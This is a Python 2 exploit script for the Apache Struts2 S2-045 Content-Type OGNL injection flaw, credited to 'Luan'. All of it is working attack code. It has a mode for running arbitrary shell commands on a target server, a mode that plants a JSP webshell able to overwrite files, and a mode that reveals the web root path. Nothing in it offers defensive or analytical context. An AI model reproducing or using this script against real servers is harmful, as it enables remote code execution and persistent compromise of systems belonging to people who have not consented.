import urllib,urllib2,sys,getopt
def exp(url,payload):
    try:
        opener = urllib2.build_opener()
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        req.add_header('Content-Type',payload)
        print opener.open(req, "").read().decode("big5")
    except urllib2.URLError,e:
        print "Exploit Fail"
jspCode = "%3C%25%40+page+language%3D%22java%22+pageEncoding%3D%22gbk%22%25%3E%3Cjsp%3Adirective.page+import%3D%22java.io.File%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.OutputStream%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.FileOutputStream%22%2F%3E%3C%25+int+i%3D0%3BString+method%3Drequest.getParameter%28%22act%22%29%3Bif%28method%21%3Dnull%26%26method.equals%28%22yoco%22%29%29%7BString+url%3Drequest.getParameter%28%22url%22%29%3BString+text%3Drequest.getParameter%28%22smart%22%29%3BFile+f%3Dnew+File%28url%29%3Bif%28f.exists%28%29%29%7Bf.delete%28%29%3B%7Dtry%7BOutputStream+o%3Dnew+FileOutputStream%28f%29%3Bo.write%28text.getBytes%28%29%29%3Bo.close%28%29%3B%7Dcatch%28Exception+e%29%7Bi%2B%2B%3B%25%3E0%3C%25%7D%7Dif%28i%3D%3D0%29%7B%25%3E1%3C%25%7D%25%3E%3Cform+action%3D%27%3Fact%3Dyoco%27+method%3D%27post%27%3E%3Cinput+size%3D%22100%22+value%3D%22%3C%25%3Dapplication.getRealPath%28%22%2F%22%29+%25%3E%22+name%3D%22url%22%3E%3Cbr%3E%3Ctextarea+rows%3D%2220%22+cols%3D%2280%22+name%3D%22smart%22%3E"
print "S2-045 Exploit // Code By Luan"
opts, args = getopt.getopt(sys.argv[1:], "u:cp:sg",["url=","cmd","path=","shell","getpath"])
url,path,payload = "","",""
for op, value in opts:
    if op in ('-u','--url'):
        url = value
    elif op in ('-c','--cmd'):
        while 1:
            cmd = raw_input("[cmd]>>")
            payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            exp(url,payload)
    elif op in ('-p','--path'):
        path = "'" + value + "'"
    elif op in ('-s','--shell'):
        print "upload webshell ..."
        if path == "":
            path = "#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')"
        payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=" + path + ").(#shell='" + jspCode + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/luan.jsp').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo shell:'+#path+'luan.jsp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        exp(url,payload)
        sys.exit(0)
    elif op in ('-g','--getpath'):
        print "get website path ..."
        payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(#path.getBytes())).(#ros.flush())}"
        exp(url,payload)
        sys.exit(0)
print "Useage : exp.py -u url [-p path] [-c cmd] [-s shell] [-g getpath]"